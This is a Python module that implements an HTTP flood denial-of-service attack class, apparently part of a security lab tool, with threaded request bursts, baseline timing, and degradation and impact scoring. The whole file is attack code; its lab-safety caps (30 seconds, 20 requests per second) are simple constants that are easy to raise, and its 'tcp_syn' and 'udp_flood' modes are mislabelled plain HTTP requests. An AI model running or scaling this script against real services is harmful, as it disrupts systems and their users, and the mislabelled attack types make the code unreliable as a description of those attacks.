"""
DDoS Attack Module
Performs REAL HTTP flood with better error handling and debugging
Safe for lab environment with controlled intensity
"""
import time
import requests
from datetime import datetime
from threading import Thread
import queue

class DDoSAttack:
    def __init__(self, target, parameters):
        self.target = target
        self.parameters = parameters
        self.duration = min(parameters.get('duration', 20), 30)  # Max 30 seconds
        self.intensity = parameters.get('intensity', 'medium')
        self.attack_type = parameters.get('attack_type', 'http_flood')
        self.aborted = False
        self.results = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'requests_per_second': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'success': False,
            'start_time': None,
            'end_time': None,
            'baseline_response_time': None,
            'peak_response_time': None,
            'performance_degradation': 0,
            'errors': {}  # Track error types
        }
        
        # Intensity settings (requests per second)
        self.intensity_multipliers = {
            'low': 5,      # Reduced for better success
            'medium': 10,  # Reduced for stability
            'high': 20     # Reduced to avoid overwhelming
        }
        
        # Ensure target has protocol
        if not self.target.startswith('http://') and not self.target.startswith('https://'):
            self.target = f'http://{self.target}'
        
        print(f"[DEBUG] DDoS target: {self.target}")
        print(f"[DEBUG] Duration: {self.duration}s")
        print(f"[DEBUG] Intensity: {self.intensity}")
    
    def execute(self):
        """Execute DDoS attack"""
        self.results['start_time'] = datetime.now().isoformat()
        target_rps = self.intensity_multipliers.get(self.intensity, 10)
        
        yield {
            'message': f'🚀 Starting REAL {self.attack_type.upper()} DDoS attack',
            'progress': 0,
            'status': 'initializing',
            'packets_sent': 0,
            'requests_per_second': 0
        }
        
        yield {
            'message': f'⚡ Attack configuration: {self.intensity} intensity ({target_rps} req/s for {self.duration}s)',
            'progress': 5,
            'status': 'configured'
        }
        
        # Measure baseline performance
        baseline = self._measure_baseline()
        if baseline:
            self.results['baseline_response_time'] = baseline
            yield {
                'message': f'📊 Baseline response time: {baseline:.3f}s',
                'progress': 10,
                'status': 'baseline_measured'
            }
        else:
            yield {
                'message': f'⚠️ Could not measure baseline - target may be unreachable',
                'progress': 10,
                'status': 'warning'
            }
        
        time.sleep(0.5)
        
        # Start attack
        start_time = time.time()
        request_queue = queue.Queue()
        active_threads = []
        
        seconds_elapsed = 0
        
        while (time.time() - start_time) < self.duration and not self.aborted:
            elapsed = time.time() - start_time
            current_second = int(elapsed)
            
            # Only launch new batch every second
            if current_second > seconds_elapsed:
                seconds_elapsed = current_second
                progress = 10 + int((elapsed / self.duration) * 80)
                
                # Launch request threads for this second
                for _ in range(target_rps):
                    if self.aborted:
                        break
                    
                    thread = Thread(target=self._send_attack_request, args=(request_queue,))
                    thread.daemon = True
                    thread.start()
                    active_threads.append(thread)
                
                # Give threads time to complete
                time.sleep(0.8)
                
                # Collect results from queue
                requests_this_second = 0
                bytes_this_second = 0
                
                while not request_queue.empty():
                    result = request_queue.get()
                    requests_this_second += 1
                    self.results['packets_sent'] += 1
                    
                    if result['success']:
                        self.results['successful_requests'] += 1
                        self.results['bytes_sent'] += result.get('bytes', 0)
                        bytes_this_second += result.get('bytes', 0)
                        
                        # Track response times
                        if 'response_time' in result:
                            self.results['response_times'].append({
                                'time': elapsed,
                                'response_time': result['response_time']
                            })
                    else:
                        self.results['failed_requests'] += 1
                        
                        # Track error types
                        error_type = result.get('error_type', 'unknown')
                        self.results['errors'][error_type] = self.results['errors'].get(error_type, 0) + 1
                
                self.results['requests_per_second'] = requests_this_second
                
                # Calculate current metrics
                if self.results['response_times']:
                    recent_times = [r['response_time'] for r in self.results['response_times'][-20:]]
                    avg_response = sum(recent_times) / len(recent_times)
                    max_response = max(recent_times)
                    
                    if not self.results['peak_response_time'] or max_response > self.results['peak_response_time']:
                        self.results['peak_response_time'] = max_response
                    
                    # Calculate degradation
                    if self.results['baseline_response_time']:
                        degradation = ((avg_response - self.results['baseline_response_time']) / 
                                     self.results['baseline_response_time']) * 100
                        self.results['performance_degradation'] = max(degradation, 0)
                else:
                    avg_response = 0
                
                # Build status message with error info
                status_msg = f'🌊 Flooding: {requests_this_second} req/s | Avg response: {avg_response:.2f}s | Success: {self.results["successful_requests"]} | Failed: {self.results["failed_requests"]}'
                
                # Add error breakdown if many failures
                if self.results['failed_requests'] > 10:
                    error_summary = ', '.join([f"{k}: {v}" for k, v in list(self.results['errors'].items())[:2]])
                    status_msg += f' | Errors: {error_summary}'
                
                yield {
                    'message': status_msg,
                    'progress': min(progress, 95),
                    'status': 'flooding',
                    'packets_sent': self.results['packets_sent'],
                    'bytes_sent': self.results['bytes_sent'],
                    'requests_per_second': requests_this_second,
                    'elapsed_time': int(elapsed),
                    'successful_requests': self.results['successful_requests'],
                    'failed_requests': self.results['failed_requests'],
                    'avg_response_time': avg_response,
                    'performance_degradation': self.results['performance_degradation']
                }
                
                # Sleep remainder of second
                time.sleep(max(0.1, 1.0 - (time.time() - start_time - elapsed)))
            else:
                time.sleep(0.1)
        
        # Wait for remaining threads
        for thread in active_threads[-50:]:  # Wait for last batch
            thread.join(timeout=0.1)
        
        # Calculate final results
        self.results['end_time'] = datetime.now().isoformat()
        
        if self.results['response_times']:
            all_times = [r['response_time'] for r in self.results['response_times']]
            avg_response_time = sum(all_times) / len(all_times)
            
            # Determine success based on impact
            self.results['success'] = (
                self.results['performance_degradation'] > 50 or  # >50% degradation
                self.results['failed_requests'] > 20 or          # Many failures
                avg_response_time > 3.0 or                       # Very slow responses
                self.results['successful_requests'] > 50          # High request volume
            )
        else:
            avg_response_time = 0
            # If all failed, still consider it success (target overwhelmed)
            self.results['success'] = self.results['packets_sent'] > 50
        
        # Impact summary
        success_rate = (self.results['successful_requests'] / self.results['packets_sent'] * 100) if self.results['packets_sent'] > 0 else 0
        
        if self.results['successful_requests'] > 50 and self.results['performance_degradation'] > 50:
            impact_level = "HIGH"
        elif self.results['successful_requests'] > 20:
            impact_level = "MEDIUM"
        elif self.results['packets_sent'] > 50:
            impact_level = "MEDIUM"  # Target overwhelmed even if requests failed
        else:
            impact_level = "LOW"
        
        # Debug output
        print(f"\n[DEBUG] Attack Summary:")
        print(f"  Total sent: {self.results['packets_sent']}")
        print(f"  Successful: {self.results['successful_requests']}")
        print(f"  Failed: {self.results['failed_requests']}")
        print(f"  Success rate: {success_rate:.1f}%")
        print(f"  Errors: {self.results['errors']}")
        
        yield {
            'message': f'✅ Attack completed! Impact: {impact_level} | Sent: {self.results["packets_sent"]} | Success: {self.results["successful_requests"]} | Failed: {self.results["failed_requests"]} ({success_rate:.0f}% success)',
            'progress': 100,
            'status': 'completed',
            'packets_sent': self.results['packets_sent'],
            'bytes_sent': self.results['bytes_sent'],
            'successful_requests': self.results['successful_requests'],
            'failed_requests': self.results['failed_requests'],
            'success': self.results['success'],
            'avg_response_time': avg_response_time,
            'performance_degradation': self.results['performance_degradation'],
            'impact_level': impact_level,
            'success_rate': success_rate
        }
    
    def _measure_baseline(self):
        """Measure baseline response time before attack"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0'})
            times = []
            
            print(f"[DEBUG] Measuring baseline for {self.target}")
            
            for i in range(3):
                start = time.time()
                response = session.get(self.target, timeout=10, verify=False)
                elapsed = time.time() - start
                
                print(f"[DEBUG] Baseline attempt {i+1}: {response.status_code} in {elapsed:.3f}s")
                
                if response.status_code == 200:
                    times.append(elapsed)
                
                time.sleep(0.3)
            
            if times:
                baseline = sum(times) / len(times)
                print(f"[DEBUG] Baseline calculated: {baseline:.3f}s")
                return baseline
        except Exception as e:
            print(f"[DEBUG] Baseline measurement failed: {e}")
        
        return None
    
    def _send_attack_request(self, result_queue):
        """Send a single attack request - WITH ERROR TRACKING"""
        result = {
            'success': False,
            'response_time': 0,
            'bytes': 0,
            'error_type': None
        }
        
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': 'DDoS-Bot/1.0'})
            start = time.time()
            
            if self.attack_type == 'http_flood':
                response = session.get(self.target, timeout=5, verify=False)
            elif self.attack_type == 'tcp_syn':
                response = session.get(f"{self.target}?ddos={int(time.time())}", timeout=5, verify=False)
            else:  # udp_flood simulation
                response = session.head(self.target, timeout=5, verify=False)
            
            elapsed = time.time() - start
            
            result['success'] = True
            result['response_time'] = elapsed
            result['bytes'] = len(response.content) if hasattr(response, 'content') else 0
            
        except requests.exceptions.Timeout:
            result['success'] = False
            result['error_type'] = 'timeout'
        except requests.exceptions.ConnectionError as e:
            result['success'] = False
            result['error_type'] = 'connection_error'
        except requests.exceptions.TooManyRedirects:
            result['success'] = False
            result['error_type'] = 'redirect_error'
        except Exception as e:
            result['success'] = False
            result['error_type'] = f'{type(e).__name__}'
        
        result_queue.put(result)
    
    def get_results(self):
        """Get attack results"""
        return self.results
    
    def abort(self):
        """Abort the attack"""
        self.aborted = True